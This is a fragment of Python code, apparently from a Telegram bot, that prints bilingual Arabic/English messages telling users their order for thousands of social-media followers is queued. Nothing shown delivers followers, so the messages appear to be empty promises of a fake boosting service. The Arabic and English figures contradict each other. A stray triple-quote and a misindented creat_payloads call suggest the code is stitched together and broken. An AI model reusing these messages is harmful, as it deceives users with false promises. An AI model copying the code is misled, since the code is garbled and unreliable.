	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 8000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 30 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 3000 followers Please wait\n until your request is reached Orders are now\n   50 requests **.   """)
if (Abs == '4'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 10000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 40 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 10000 followers Please wait\n until your request is reached Orders are now\n   200 requests **.   """)
if (Abs == '5'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 15000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 50 طلب**\n\n - Welcome dear, once again your request has been\nselected to throw 15000 followers Please wait\n until your request is reached Orders are now\n   250 requests **.   """)
if (Abs == '6'):
	print(Ba_bS+"""\n- اهلا بك عزيزي مره اخرى تم اختيار طلبم لرشق 20000 \nمتابع يرجى الانتضار الى ان يتم الوصول الى طلبك\n الطلبات الان 60 طلب **\n\n - Welcome dear, once again your request has been\nselected to throw 20000 followers Please wait\n until your request is reached Orders are now\n   2 requests **.   """) 
            '''
						creat_payloads(id, ms, payload)

bot.infinity_polling()